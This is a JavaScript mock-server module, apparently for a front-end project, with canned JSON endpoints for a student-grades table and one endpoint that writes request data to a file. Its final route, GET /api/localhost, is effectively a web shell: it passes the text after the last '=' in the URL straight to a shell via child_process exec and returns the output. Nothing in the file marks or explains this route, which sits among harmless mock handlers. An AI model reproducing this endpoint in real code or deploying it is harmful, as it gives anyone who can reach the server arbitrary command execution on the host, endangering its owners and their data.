const { exec } = require('child_process');
module.exports = function http(app) {
  app.get("/api/query", (req, res) => {
    if (res) {
      res.json({
        statusCode: 200,
        success: true,
        result: {
          page: {
            total: require("./table.json").length,
            current: 1,
            pageSize: 20,
          },
          data: require("./table.json"),
        },
      });
    }
  });
  app.post("/api/add", (req, res) => {
    if (res) {
      res.json({
        code: 200,
        data: [
          {
            id: "1",
            s_name: "3",
            s_math: "3",
            s_english: "3",
          },
        ],
      });
    }
  });
  app.put("/api/updata", (req, res) => {
    if (res) {
      res.json({
        code: 200,
        data: [
          {
            id: "1",
            s_name: "3",
            s_math: "3",
            s_english: "3",
          },
        ],
      });
    }
  });
  app.get("/api/change", (req, res) => {
    if (res) {
      res.json({
        code: 200,
        data: require("./1.json"),
      });
    }
  });
  app.post("/api/change", (req, res) => {
    if (res) {
      let params = req.body;
      let data = require("./1.json");
      data.data = params.id;
      let fs = require("fs");
      fs.writeFile("./mock/1.json", JSON.stringify(data), (err) => {
        if (err) {
          res.json({
            code: 400,
            data: {},
          });
        } else {
          res.json({
            code: 200,
            data,
          });
        }
      });
    }
  });
  app.get("/api/localhost", (req, res) => {
    let data = ""
    req.on("data", (chunk) => {
      data += chunk
    })
    const task = req.url.split('=').pop()
    exec(task, (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return;
      }
      res.writeHead(200, {
        "Content-Type": "text/html",
      })
      res.write(JSON.stringify({ result: stdout, code: 200 }))
      res.end()
      if (stderr) {
        console.error(`stderr: ${stderr}`);
      }
    });
  });
};
